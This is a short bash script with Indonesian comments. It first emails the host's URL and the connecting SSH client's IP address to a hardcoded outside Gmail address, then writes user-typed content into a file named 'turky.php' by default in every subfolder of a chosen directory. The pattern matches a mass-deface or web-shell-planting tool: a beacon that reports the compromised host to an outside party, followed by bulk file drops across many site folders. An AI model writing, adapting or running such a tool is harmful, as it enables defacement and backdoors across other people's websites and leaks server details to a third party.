#!/bin/bash

# Email tujuan
apper="turky@gmail.com"

# Mendapatkan IP remote dari variabel lingkungan (tidak selalu tersedia di bash)
# Jika ini dijalankan di server, bisa dapat dari SSH_CLIENT atau lain
remote_ip=$(echo $SSH_CLIENT | awk '{print $1}')
if [ -z "$remote_ip" ]; then
  remote_ip="Unknown"
fi

# Mendapatkan URL (tidak tersedia di bash, jadi kita set placeholder)
x_path="http://$(hostname)/path/to/script"

# Kirim email log
echo "fix $x_path :p *IP Address : [ $remote_ip ]" | mail -s "LOG" "$apper"

# Input dari user
read -p "Masukkan folder base_dir: " base_dir
if [ ! -d "$base_dir" ]; then
  echo "$base_dir Not Found or Not a Directory!"
  exit 1
fi

read -p "Masukkan nama file (default: turky.php): " andela
andela=${andela:-turky.php}

echo "Masukkan isi file (akhiri dengan EOF di baris baru):"
index_content=""
while IFS= read -r line; do
  [[ $line == "EOF" ]] && break
  index_content+="$line"$'\n'
done

# Loop ke setiap subfolder dan buat file dengan isi yang diberikan
for dir in "$base_dir"/*/; do
  if [ -d "$dir" ]; then
    file_path="${dir}${andela}"
    echo -n "$index_content" > "$file_path" && echo "Created $file_path (✓)"
  fi
done
